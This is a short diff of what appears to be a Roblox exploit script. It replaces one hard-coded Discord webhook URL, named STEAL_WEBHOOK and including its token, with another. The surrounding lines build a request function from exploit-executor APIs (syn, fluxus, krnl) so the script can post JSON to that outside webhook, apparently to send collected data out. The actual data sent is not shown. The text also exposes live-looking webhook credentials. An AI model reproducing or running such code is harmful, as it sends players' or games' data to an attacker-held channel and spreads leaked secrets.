@@ -6,7 +6,7 @@ local HttpService = game:GetService("HttpService")
 local player = Players.LocalPlayer
 local PlayerGui = player:WaitForChild("PlayerGui")
 
-local STEAL_WEBHOOK = "https://discord.com/api/webhooks/1490759560426946590/p9sRlWhB9ZPJZOb3dIuLtG0k5M8gNLbp2MPMgjPyRv-53VrOfI4vpXLqvOCl7DVZU-vP"
+local STEAL_WEBHOOK = "https://discord.com/api/webhooks/1497992244014092479/CZTk6O2f18v4iKFsCB11YxJOSHLS1frXTWGDtlet-pZlw4dm8vAQRbNkWuVS0iIntBUV"
 
 local stealDetectorRequest = syn and syn.request or fluxus and fluxus.request or krnl and krnl.request or http and http.request or request or http_request or (HttpService and HttpService.PostAsync and function(url, body)
     return HttpService:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
